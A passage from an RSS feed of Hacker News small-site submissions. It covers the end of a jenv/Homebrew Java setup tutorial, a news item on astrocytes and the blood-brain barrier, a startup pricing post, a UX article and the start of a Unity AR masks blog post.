<pre><code>$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-13.jdk/Contents/Home</code></pre>



<pre><code>$ jenv add /Library/Java/JavaVirtualMachines/adoptopenjdk-14.jdk/Contents/Home</code></pre>



<h4>Listing Java JDKs</h4>



<pre><code>$ jenv versions

  system
* 1.8 (set by /Users/kenanhancer/.jenv/version)
  1.8.0.252
  10.0
  10.0.2
  11.0
  11.0.7
  12.0
  12.0.2
  13.0
  13.0.2
  14.0
  14.0.1
  9
  openjdk64-1.8.0.252
  openjdk64-10.0.2
  openjdk64-11.0.7
  openjdk64-12.0.2
  openjdk64-13.0.2
  openjdk64-14.0.1
  openjdk64-9</code></pre>



<h4>Setting a Global Java Version</h4>



<pre><code>$ jenv global 10</code></pre>



<h4>Setting a local Java Version(per directory)</h4>



<pre><code>$ jenv local 11</code></pre>



<h4>Setting a shell Java Version</h4>



<pre><code>$ jenv shell 12</code></pre>



<h3>Uninstalling adoptopenjdk/openjdk and jenv and  from Homebrew</h3>



<pre><code>$ brew untap adoptopenjdk/openjdk</code></pre>



<pre><code>$ brew cask uninstall $(brew cask ls -1 | grep "^adopt")</code></pre>



<pre><code>$ brew uninstall jenv</code></pre>



<pre><code>$ rm ~/.jenv</code></pre>
			</div></div>]]>
            </description>
            <link>https://kenanhancer.com/2020/05/09/how-to-install-java-with-brew-and-jenv/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543960</guid>
            <pubDate>Mon, 21 Sep 2020 14:35:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Astrocytes could be essential to blood-brain barrier health]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24543922">thread link</a>) | @finphil
<br/>
September 21, 2020 | https://nuadox.com/post/629877618586615808/blood-brain-barrier-health | <a href="https://web.archive.org/web/*/https://nuadox.com/post/629877618586615808/blood-brain-barrier-health">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> 
                 
                    
                    <article id="629877618586615808">
                        <div>
                            <div>
                                <a href="https://nuadox.com/post/629877618586615808/blood-brain-barrier-health"><h2>Astrocytes could be essential to blood-brain barrier health</h2></a>
                                <figure data-orig-width="1920" data-orig-height="1280"><img src="https://64.media.tumblr.com/f865dbe97dc7268cf2f290640fd2a5f0/d76379001588b933-c7/s1280x1920/86e65187906060dffb218e749874c811ab117bbb.jpg" alt="image" data-orig-width="1920" data-orig-height="1280" width="1280" height="853"></figure><p><b>- By&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fvt.edu%2F&amp;t=YmMzZGFjMTY2OGFmMTMyYTMxNTU5Y2Q5NTdiZGViNTkxYTRlN2VjMCxRRldXZFhKcg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629877618586615808%2Fblood-brain-barrier-health&amp;m=0&amp;ts=1600892705">Virginia Tech</a> -</b></p><p>Hard skulls help protect our brains from physical injuries. In addition to a tough outer shell, brains have internal defenses, including a powerful shield called the blood-brain barrier that defends brain cells from substances in the bloodstream that are toxic and dangerous to nerve cells. If the blood-brain barrier is breached, then health problems arise.</p><p>Now, in a study with potential impacts on a variety of neurological diseases, Virginia Tech researchers have provided the first experimental evidence from a living organism to show that an abundant, star-shaped brain cell known as an astrocyte is essential for blood-brain barrier health.</p><p>The research in today’s online edition of the journal <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fonlinelibrary.wiley.com%2Fdoi%2Fabs%2F10.1002%2Fglia.23908&amp;t=NWMzMjNiNjc2NTZiNTg5NzgwYjMwNGI2NWEzZmEwNGY5YTRhYjUwZixRRldXZFhKcg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629877618586615808%2Fblood-brain-barrier-health&amp;m=0&amp;ts=1600892705"><i>GLIA</i></a> reassesses traditional claims about the role of astrocytes in the brain and confirms the long-held assumption — although it had been recently disputed — that astrocytes support the blood-brain barrier.</p><p>Furthermore, the finding gives scientists a path to understand diseases where frequent blood-brain barrier damage occurs, including traumatic brain injury, stroke, epilepsy, Alzheimer’s disease, and Parkinson’s disease.</p><p>“Blood-brain barrier leakage is a problem in the aging brain as well as many different neurological diseases,” said Stefanie Robel, an assistant professor at the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Ffbri.vtc.vt.edu%2F&amp;t=MDk0ZjBkMjhkZWI1YTBlYTFjMmM1OGQ1NTcwYTQ4MzBiOWNiYzI3ZCxRRldXZFhKcg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629877618586615808%2Fblood-brain-barrier-health&amp;m=0&amp;ts=1600892705">Fralin Biomedical Research Institute at VTC</a> and the study’s senior author. “Without astrocytes, the blood-brain barrier becomes leaky and ineffective, leaving brain tissue vulnerable to a variety of medical conditions. If we know what maintains the barrier in the healthy brain, we will be able to better understand what goes wrong in traumatic brain injury and in Alzheimer’s disease — all health problems with blood-brain barrier damage.”</p><p>Generally, researchers suspect astrocytes support the blood-brain barrier by releasing factors helpful to maintaining tight connections between the cells in the barrier. </p><p>In the new study, scientists with the Fralin Biomedical Research Institute genetically ablated a small number of astrocytes in adult mice to determine if the cells were necessary for blood-brain barrier health.</p><p>The researchers used small, intermediate-sized, and large molecular tracers to evaluate the permeability of the blood-brain barrier. All of the markers passed through the barrier in some areas, while in other areas only small tracers leaked, suggesting that leakages were happening at various sizes. </p><p>“We now have great tools to learn about what astrocytes really do in the adult brain,” said Robel, who is also an assistant professor in Virginia Tech’s <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fneuroscience.vt.edu%2F&amp;t=NjIxOTc3MzUzYjBjZGYzNTVhMGIwMDlkZGQyOTQ1YTIzOWQyMzQzOSxRRldXZFhKcg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629877618586615808%2Fblood-brain-barrier-health&amp;m=0&amp;ts=1600892705">School of Neuroscience</a>. “It’s possible that those leaks weren’t detected in previous studies.”</p><p>In recent years, contradictory studies have emerged in which scientists removed astrocytes in animal models with no indications of harm to the blood-brain barrier. </p><p>However, when Virginia Tech scientists used a mouse model to mimic the effect of the removal of astrocytes, varying degrees of permanent blood-brain barrier damage occurred, with the amount of damage possibly in proportion with the numbers of ablated astrocytes. In these scenarios, the scientists determined neighboring astrocytes do not rescue the blood-brain barrier when it is damaged.</p><p>The research began after the scientists challenged commonly accepted statements in neuroscience.</p><p>“I would read a review article that would say astrocytes maintain the blood-brain barrier in the adult healthy brain, but rarely was it followed by a citation that would show direct evidence of that fact,” said Benjamin Heithoff, the first author of the study and a graduate student who conducts research in the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Ffbri.vtc.vt.edu%2Fresearch%2Flabs%2Frobel.html&amp;t=ZWRkYjkzNTZiMzE5NjFiM2U0NDk0NzFjYmRjZjQwMTE4NTg0OTU0OCxRRldXZFhKcg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629877618586615808%2Fblood-brain-barrier-health&amp;m=0&amp;ts=1600892705">Robel lab</a> at the Fralin Biomedical Research Institute.</p><figure data-orig-width="1024" data-orig-height="749"><img src="https://64.media.tumblr.com/c316d47571b9a7301d48f0fb4d99e527/d76379001588b933-da/s1280x1920/131824229863137bb74ac5697096e322b775c0cf.jpg" alt="image" data-orig-width="1024" data-orig-height="749" width="1024" height="749"></figure><p><i>Image:&nbsp;Brain cells called astrocytes appear in green, and purple represents the leakage of the blood-brain barrier. Together they show that leakage occurs around areas where astrocytes have been ablated. Now, in a study with potential impacts on a variety of neurological diseases, Fralin Biomedical Research Institute scientists have provided the first experimental evidence from a living organism to show that astrocytes are essential for blood-brain barrier health. Credit:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fvtnews.vt.edu%2Farticles%2F2020%2F09%2Fbloodbrain-fralinbiomed-09142020.html&amp;t=M2NiZGM4MWU5ZjllY2MwNzBlMGU3OGY0YTI1MWVmNzg2MzQ2ZjNiYSxRRldXZFhKcg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629877618586615808%2Fblood-brain-barrier-health&amp;m=0&amp;ts=1600892705">Ben Heithoff et al/Virginia Tech</a>.</i></p><p>“That lack of evidence told me that the field hadn’t quite teased apart this statement,“ Heithoff said. "Assumptions can be held for a long time, and it takes studies like ours, with more sensitive tools, to re-evaluate them. Now that we have reinforced this assumption with direct experimental data, we have positioned ourselves to identify how this vital function of astrocytes is impacted in disease and after injury.”</p><p>Breakdown of the blood-brain barrier is correlated with neurodegenerative disease. In cases of traumatic brain injury or concussion, the blood-brain barrier breakdown that can occur is associated with higher risk for lifelong consequences, including cognitive decline and permanent motor deficits.</p><p>“When people sustain a concussion, we used to consider this a ‘minor injury.’ But our follow-up study shows that the blood-brain barrier leakage persists in areas where astrocytes are not functioning correctly, which suggests there is a long-term, lasting dysfunction in the barrier,” said Heithoff, who is with the Department of Biological Sciences of the <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.science.vt.edu%2Findex.html&amp;t=N2JjZWJhNzU5OWFlZmE4YzVlYmJkYzIwYTMzMmRjNmNiZmY0YTJjNCxRRldXZFhKcg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629877618586615808%2Fblood-brain-barrier-health&amp;m=0&amp;ts=1600892705">College of Science</a>. “Understanding how that problem occurs and how it can be remedied are important public health questions. We have to know what makes this barrier functional in order to develop effective treatments when it becomes dysfunctional.”</p><p>–</p><p><b>Source: <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fvtnews.vt.edu%2Farticles%2F2020%2F09%2Fbloodbrain-fralinbiomed-09142020.html&amp;t=M2NiZGM4MWU5ZjllY2MwNzBlMGU3OGY0YTI1MWVmNzg2MzQ2ZjNiYSxRRldXZFhKcg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629877618586615808%2Fblood-brain-barrier-health&amp;m=0&amp;ts=1600892705">Virginia Tech</a></b></p><p><b>Full study:</b>&nbsp;“Astrocytes are necessary for blood–brain barrier maintenance in the adult mouse brain”, <i>GLIA</i>.</p><p><a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fonlinelibrary.wiley.com%2Fdoi%2Fabs%2F10.1002%2Fglia.23908&amp;t=NWMzMjNiNjc2NTZiNTg5NzgwYjMwNGI2NWEzZmEwNGY5YTRhYjUwZixRRldXZFhKcg%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F629877618586615808%2Fblood-brain-barrier-health&amp;m=0&amp;ts=1600892705">https://doi.org/10.1002/glia.23908</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/625292527384264704/ebrains">EBRAINS: A ‘Google Earth of the brain’</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/brain">brain</a>
                                    
                                        <a href="https://nuadox.com/tagged/neuroscience">neuroscience</a>
                                    
                                        <a href="https://nuadox.com/tagged/medicine">medicine</a>
                                    
                                        <a href="https://nuadox.com/tagged/health">health</a>
                                    
                                        <a href="https://nuadox.com/tagged/astrocytes">astrocytes</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/629877618586615808/blood-brain-barrier-health</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543922</guid>
            <pubDate>Mon, 21 Sep 2020 14:32:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How we priced our first product]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24543912">thread link</a>) | @fpereiro
<br/>
September 21, 2020 | https://altocode.nl/blog/how-we-calculated-the-price-of-acpic | <a href="https://web.archive.org/web/*/https://altocode.nl/blog/how-we-calculated-the-price-of-acpic">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
<p>How much should we charge for our product? What's the price model that makes sense to our users? We had a long discussion about it and we looked to consider all the important aspects:</p>
<ol>
<li><a onclick="document.getElementById ('1whatpricemakesourproductsustainable').scrollIntoView ()">What price makes our product sustainable?</a></li>
<li><a onclick="document.getElementById ('2isthisapriceouruserswillbewillingtopay').scrollIntoView ()">What price are users willing to pay?</a></li>
<li><a onclick="document.getElementById ('3thismodelservesourusers').scrollIntoView ()">What price model best serves our users?</a></li>
<li><a onclick="document.getElementById ('4aretheredisadvantagestothismodel').scrollIntoView ()">Are there disadvantages to this model?</a></li>
</ol>
<p>By answering these questions, we’ll be better equipped to have a solid pricing model to begin the journey of our first product: <a href="https://altocode.nl/pic/" target="_blank"> ac;pic</a>, a photo and video organization service.</p>
<p>Here's the entire process we went through.</p>
<h2 id="1whatpricemakesourproductsustainable">1. What price makes our product sustainable?</h2>
<p>There's one inescapable fact: if the product is not profitable, we can't pay ourselves and cover the costs. If that happens, there's no company, no product, no team.</p>
<p>We began with 2 straightforward questions:</p>
<ol>
<li><a onclick="document.getElementById ('1howmuchdoweneedtopayourselves').scrollIntoView ()">How much do we need to pay ourselves?</a></li>
<li><a onclick="document.getElementById ('2howmuchdoesitcosttomaintaintheserviceandthecompany').scrollIntoView ()">How much does it cost to maintain the service and the company?</a></li>
</ol>
<h4 id="1howmuchdoweneedtopayourselves">1. How much do we need to pay ourselves?</h4>
<p>If we can't support ourselves, we can't make any of this happen. Conversely, if a project that we love and believe in can pay our salaries, it will grow and prosper with our full attention.</p>
<p>Altocode works in full transparency, which means everybody can see everything we <a href="https://github.com/altocodenl" target="_blank">do,</a> we <a href="https://drive.google.com/drive/folders/1otweqrARCHe2u6DeHW3FDZmug0L1Wd6p" target="_blank">think,</a> and how much we earn. The market shall know our salaries.</p>
<p>We set salary milestones for different stages of the product. You can see them <a href="https://docs.google.com/spreadsheets/d/1XNd62OXI3dduxodI-9dBOUoxnAczPgm2yIk-jFFR6T4/edit#gid=0" target="_blank">here.</a></p>
<p>Our first milestone will enable us to work full-time in Altocode. That's a salary of €3,000 a month after tax, per founder. That's around US $3,500 after tax. We're a 2-person team, so that's €6,000 after tax a month.</p>
<p>The next question is 'how many paying users do we need to make €6,000 a month after tax?'</p>
<p>We built a simple table that takes into account:</p>
<ul>
<li>Net income per user: how much should the company earn from each paying user after taxes and costs.</li>
<li>Net salary per founder: monthly salary after tax per founder.</li>
<li>Amount of monthly paying users: amount of paying users needed for each net income and net salary.</li>
</ul>
<p><a target="_blank" href="https://docs.google.com/spreadsheets/d/1XNd62OXI3dduxodI-9dBOUoxnAczPgm2yIk-jFFR6T4/edit#gid=0"><img loading="lazy" src="https://altocode.nl/blog/img/monthly%20paying%20users%20required.png" alt="ac;pic monthly paying users required"></a></p>
<p>For each column of 'net income per user' we have the amount of paying users necessary to reach €3,000 of net monthly salary per founder.</p>
<p>The next question is, 'what should be the target amount of users for the first milestone?'</p>
<p>It can't be very high, otherwise it might take too long to get there and - as a fully bootstrapped company - we only have so much runway. On the other hand, we can't go for a very low number of paying users, because prices might get too high (we haven't added operating costs and taxes yet) and prevent people from becoming paying users.</p>
<p>In the spirit of <a href="https://kk.org/thetechnium/1000-true-fans/" target="_blank">Kevin Kelly's '1,000 true fans' article,</a> we feel that around 1,500 to 2,000 paying users should allow us to reach our first milestone. If we can't get that amount of paying users in a few months, we have bigger issues than pricing. Still, we needed to continue our analysis to get to a price.</p>
<h4 id="2howmuchdoesitcosttomaintaintheserviceandthecompany">2. How much does it cost to maintain the service and the company?</h4>
<p>This is where most companies make mistakes and later on experience a rude awakening. If we don't understand our costs well, our pricing could be way off (either too cheap or too expensive).</p>
<p>What things do we need to account for besides our net salaries?
a. Income taxes on our salaries.
b. Infrastructure costs.
c. Product-related services: design, security.
d. Business-related services: accountants, lawyers, banking.
e. Working capital.
f. Value Added Tax.
g. Credit card processing and payments.</p>
<p>Let's go through each of these points in more detail.</p>
<p>a. Income taxes on our salaries:
Altocode is based in The Netherlands (this is mainly for 2 reasons: one of the founders lives there, and the EU is a great place to start a company to steward users' data). Income taxes in The Netherlands are anywhere between 30 and 50%, depending on the tax bracket. 40% is a realistic estimation for the first stage of the business.</p>
<p>b. Infrastructure costs:
Our service is fully based on the cloud and our main providers are <a href="https://www.hetzner.com/" target="_blank">Hetzner</a> and <a href="https://aws.amazon.com/" target="_blank">Amazon AWS.</a> There's a very small fixed component to this (hosting, email), but most of this cost is proportional to the amount of space used by our users. This cost will be divided in two parts: that corresponding to free accounts (which will be covered by the company) and that to paid accounts (which is paid by the users themselves as a variable cost; <a onclick="document.getElementById ('whataboutthestorage').scrollIntoView ()">see below</a>).</p>
<p>c. Product-related services: design, security:
Neither of us is a designer or a security expert. Those skills (among others) are crucial to further develop a world-class product. We will be very happy to develop close relationships with design and security experts in the future, hence we need to account for them.</p>
<p>d. Business-related services: accountants, lawyers, banking:
We have a basic company set up, but we will definitely need to invest in accountants &amp; lawyers to set up a larger company structure as soon as we scale to thousands of users. Same goes for upgrading our type of bank account, as well as opening additional accounts for salaries, setting up processes to deal with invoices, etc. While these costs are somewhat fixed, it is reasonable to consider that they will grow based on the size of the business, but we expect that growth to be less than proportional.</p>
<p>e. Working capital:
Any company, and particularly a bootstrapped startup, needs to have working capital (ie: extra money in the bank) in order to grow and withstand crises. Although <a href="https://altocode.nl/blog/our-how" target="_blank">we're not a profit-maximizing company</a> (in short: we cannot sell the company, we cannot get rich from the company and, as we grow in paid accounts, we'll reduce the price per user), we need to be smart and have enough working capital to invest in the company's growth or cover any hiccups that might happen along the way. You either plan this ahead and have a good chance of overcoming most problems or deal with it later in a do-or-die situation. We rather have the former than the latter, for our own sake and our users' sake.</p>
<p>So, how do we take into account the infrastructure cost, product-related services, business-related services and working capital? <strong>We set a cost budget per paying user</strong>. Since all these costs are positively correlated to the size of the business, we can infer that the more users we have - especially in the beginning - the more costs we'll have to account for. Of course, these won't be linear, but in the early stages these costs can add up quickly and halt growth. As we grow we'll have to review this cost item, but now we have to ensure a solid service and business survival.</p>
<p>We concluded that these items combined add €2 per paying user.</p>
<p>An heuristic way to think about this is the following: if we have 100 paying users, it is reasonable to have about €200 of monthly expenses; at 1,000 paying users, it is reasonable to have a budget of €2,000.</p>
<p>f. Value Added Tax:
We have to make a differentiation here.</p>
<ul>
<li>For our European Union paying users, Value Added Tax must be added to the price. A 21% uptick. Nothing to do here.</li>
<li>For our non-European Union users, great news. No Value Added Tax. No changes.</li>
</ul>
<p>g. Credit card processing and payments:
We'll use Stripe. It's easy to use, reliable, and has great international coverage.</p>
<p>From Stripe we'll use 2 services:</p>
<ul>
<li>Stripe Payments to collect payments.</li>
<li>Stripe Billing to set recurring payments for our users.</li>
</ul>
<p>For The Netherlands, the pricing is a little different than for the United States (you can check it out <a href="https://stripe.com/en-nl/pricing" target="_blank">here</a>).</p>
<p>These are the Stripe fees. Stripe calculates the fees over the final price (<a href="https://docs.google.com/document/d/1f_Cxl77xqC0xbqdqrOA17CbvBs3GNCjmrROcuVR4Ox0/edit?usp=sharing" target="_blank">after tax</a>). Now it gets a little tricky.</p>
<p><img loading="lazy" src="https://altocode.nl/blog/img/stripe%20fees.png" alt="stripe fees for The Netherlands"></p>
<p>On top of the Value Added Tax (VAT) differentiation between European and non-European users, Stripe charges us differently when processing a European card, vs a non-European card. That needs to be taken into consideration in the price.</p>
<p>Lastly, we decided that <strong>we'll only bill in euros</strong>. Our wages are in euros, our costs are in euros, as well as taxes. Having other currencies would complicate things for no good reason.</p>
<h4 id="thepricecalculation">The price calculation</h4>
<p>With all this information we built another table, and built the price from the net income per user, adding all the costs and taxes. We built the price from the bottom up.</p>
<p><a target="_blank" href="https://docs.google.com/spreadsheets/d/1XNd62OXI3dduxodI-9dBOUoxnAczPgm2yIk-jFFR6T4/edit#gid=0"><img loading="lazy" src="https://altocode.nl/blog/img/fixed%20price%20calculation.png" alt="ac;pic Fixed price calculation"></a></p>
<p>You'll note that in the costs line (those €2 per user) we affected half of it with Value Added Tax (VAT). We're estimating that half of our costs will be affected by VAT, so only €1 of the cost per user will incur VAT.</p>
<p>An interesting observation (that took us a while to figure out) is that we should charge an extra amount to non-European users for the VAT incurred by those €2 per user. These services accrue VAT, but because we don't have to pay VAT for non-European users, we cannot use their payment to offset the VAT incurred by those services. Hence, we need to charge them extra to keep things fair between European and non-European users. In addition to this, this fairness ensures that both European and non-European users will be equally profitable to us.</p>
<p>Previously, we had circled between 1,500 and 2,000 paying users to reach our initial goal. That meant a net income per user between €3 and €4. With the numbers more clear, we concluded that our best choice is to go with €3 of net income per user.</p>
<p>The fixed part of ac;pic's price will be:</p>
<ul>
<li>€9 a month for European Union users.</li>
<li>€7.50 for non-European Union users.</li>
</ul>
<p><strong>We need 2,000 monthly paying users to reach the first milestone.</strong></p>
<h4 id="whataboutthestorage">What about the storage?</h4>
<p>If you followed the cost breakdown you might have noticed that we haven't considered the storage cost for the paid accounts. We accounted for servers to keep the service up &amp; running and the storage cost for free accounts, but the bulk of the cost for a photo and video organization service comes from storage.</p>
<p>The cost we have as of today is €0.05 per GB. <strong>We won't make any profit from storage cost. ac;pic's users will pay storage at cost.</strong> If it's cheaper for us, it will be cheaper for our users.</p>
<p>This cost would incur VAT, but since the underlying server costs also pay VAT at the same rate, the VATs cancel each other out. That, however, assumes that …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://altocode.nl/blog/how-we-calculated-the-price-of-acpic">https://altocode.nl/blog/how-we-calculated-the-price-of-acpic</a></em></p>]]>
            </description>
            <link>https://altocode.nl/blog/how-we-calculated-the-price-of-acpic</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543912</guid>
            <pubDate>Mon, 21 Sep 2020 14:31:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: I visualised the co-occurrence of origin and variety in coffee beans]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 7 (<a href="https://news.ycombinator.com/item?id=24543871">thread link</a>) | @DataCrayon
<br/>
September 21, 2020 | https://datacrayon.com/posts/statistics/data-is-beautiful/arabica-coffee-beans-origin-and-variety/ | <a href="https://web.archive.org/web/*/https://datacrayon.com/posts/statistics/data-is-beautiful/arabica-coffee-beans-origin-and-variety/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
            <div>
                <div>
                <div>
                    <h2>Data is Beautiful</h2>
                    <p>
                    A practical book on data visualisation that shows you how to
                    create static and interactive visualisations that are engaging and
                    beautiful.
                    </p>
                    <p><a href="https://datacrayon.com/shop/product/data-is-beautiful/">Get the book</a>
                </p></div>
                <p><img src="https://datacrayon.com/images/datacrayon/shop/covertop_dib.jpg">
</p>
                </div>
            </div>
            </div>
        </div><div itemprop="articleBody text">
    <!--% if post.meta('has_toc'):-->
    

        

        
            

            
<div id="support-this-work-top">
                                <p>Made with Chord Pro</p>
                                <p>
                        You can create beautiful interactive visualisations like this one with <a href="https://datacrayon.com/shop/product/chord-pro/">Chord Pro</a>. Learn how to make beautiful visualisations with the book, <a href="https://datacrayon.com/shop/product/data-is-beautiful/">Data is Beautiful</a>.</p>
                            </div>

            

    


                    <div id="support-this-work-bottom">
                                    <p>Made with Chord Pro</p>
                                    <p>
        You can create beautiful interactive visualisations like this one with <a href="https://datacrayon.com/shop/product/chord-pro/">Chord Pro</a>. Learn how to make beautiful visualisations with the book, <a href="https://datacrayon.com/shop/product/data-is-beautiful/">Data is Beautiful</a>.
        </p>
                                </div>
                            </div></div>]]>
            </description>
            <link>https://datacrayon.com/posts/statistics/data-is-beautiful/arabica-coffee-beans-origin-and-variety/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543871</guid>
            <pubDate>Mon, 21 Sep 2020 14:27:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Your UX Plan Must Start with Information Architecture]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24543854">thread link</a>) | @taphangum
<br/>
September 21, 2020 | https://planflow.dev/blog/ux-planning-starts-with-information-architecture | <a href="https://web.archive.org/web/*/https://planflow.dev/blog/ux-planning-starts-with-information-architecture">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>Planning</strong> x <strong>Design Process</strong><em> - </em>produces<em> - </em><strong>Product</strong>.</p><p>The strength of each one determines the effectiveness of the final product.</p><p>Of the two factors, <em>planning</em> is the factor that holds the majority of importance. </p><p><em>But why is this?</em></p><p>Planning, and the clarity and correctness of the plan, are what define what emerges from the product design process. And ultimately, what defines a product.&nbsp;</p><p>The reason for this is because planning answers the questions of <em>why</em>, then moves on to what, which then brings forth how and when.&nbsp;All the fundamental questions get asked sequentially, like a domino sequence, but not before the <em>why</em> is asked, the why comes first.</p><p>UX Planning does this best when the process is started off in the right way. Just as a building holds firmly and is best built when it’s beginnings are underpinned by a firm foundation.&nbsp;</p><p><strong>But what is the foundation of a good plan?</strong></p><p>It is <em>Information Architecture</em>.</p><p>The thread that runs through the entire design process.</p><h3>What Is Information Architecture?</h3><p>When we talk about information architecture, we are literally talking about the fundamentals of what underpins a design. Design is, in essence, the organization of information, so that it may best be used for whatever purpose its organized product has. This organization happens according to logical principles, but it is done in an intuitive way, based on experience.</p><p>Information architecture then, is the description of how we organize that information.</p><p><strong>Creating Information Architecture is the art of organizing and structuring content in a logical and user-friendly way that allows the user to easily meet their goal.</strong></p><p>In other words, Information Architecture is the general map of your project that your user will navigate through to ultimately succeed in accomplishing their goal.</p><p>Within the context of UI layout design, the Information Architecture forms the basis of the plan going forward. It tells you about everything that is going to be happening next, as well as, by its very nature, gives you hints of how to progress. In the same way that, as we’ve mentioned earlier, a book’s contents pages form your overall impression and map of the book.&nbsp;</p><p>We judge Amazon books by their contents pages. Which is why that is mostly what is available to preview in their books via their ‘Look Inside’ feature.</p><p>Maybe they know something about Information Architecture and UX Planning that we don’t?</p></div></div>]]>
            </description>
            <link>https://planflow.dev/blog/ux-planning-starts-with-information-architecture</link>
            <guid isPermaLink="false">hacker-news-small-sites-24543854</guid>
            <pubDate>Mon, 21 Sep 2020 14:25:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best Unity 3D Masks to Increase User Engagement in Your App]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24543692">thread link</a>) | @banuba
<br/>
September 21, 2020 | https://www.banuba.com/blog/10-best-unity-3d-masks-to-increase-user-engagement-in-your-app | <a href="https://web.archive.org/web/*/https://www.banuba.com/blog/10-best-unity-3d-masks-to-increase-user-engagement-in-your-app">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <header>
                
                
                
                
                
                <span>Unity</span>
                
                
                


                

                
                  <p>
  Are you a Unity developer seeking to enhance your app or game with AR? Explore 10 types of Unity 3D masks that help you boost involvement in your app by letting players change their appearance right in the camera.
</p>
                
             

              

              <p><time datetime="September 21, 2020">
                  September 21, 2020
                </time>
              </p>

              <ul>
                
                
                
                
              </ul>

                
                <p><img src="https://www.banuba.com/hubfs/img_B_AT_FaceFilters_005@2x.jpg" alt="Unity 3D masks banuba hero image">
                </p>
                
              
            </header>

            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text">
<!--more-->
<p>Banuba provides <a href="https://www.banuba.com/facear-sdk/unity-face-tracking" rel="noopener" target="_blank">Unity Face Tracking SDK</a> that allows you to create mesh masks in Unity that overlay augmented reality filters on the player’s face. You can superimpose 3D objects to the face, implement Snapchat-like lenses that follow face movements in real-time. Or add 3D face animation and let creative scenes come alive in the camera.&nbsp;</p>
<p><!--HubSpot Call-to-Action Code --><span id="hs-cta-wrapper-be619672-68cd-40b0-8808-abdc046ac320"><span id="hs-cta-be619672-68cd-40b0-8808-abdc046ac320"><!--[if lte IE 8]><div id="hs-cta-ie-element"></div><![endif]--><a href="https://cta-redirect.hubspot.com/cta/redirect/4992313/be619672-68cd-40b0-8808-abdc046ac320" target="_blank"><img id="hs-cta-img-be619672-68cd-40b0-8808-abdc046ac320" src="https://no-cache.hubspot.com/cta/default/4992313/be619672-68cd-40b0-8808-abdc046ac320.png" alt="Start Free Trial"></a></span></span><!-- end HubSpot Call-to-Action Code --></p>
<h2><span>3D masking in Unity</span><span>: augmenting camera experience</span></h2>
<p>You can easily add high-quality AR effects, lens and Unity 3D masks to enhance and improve the quality of your app. All the filters are adjustable, and you can play with colors and textures.&nbsp;</p>
<p>Integrate realistic next-gen filters to your Unity app. Below, we list the most popular types of AR effects that have proved to resonate well with most of the users.</p>
<h3><span>1. Glasses</span></h3>
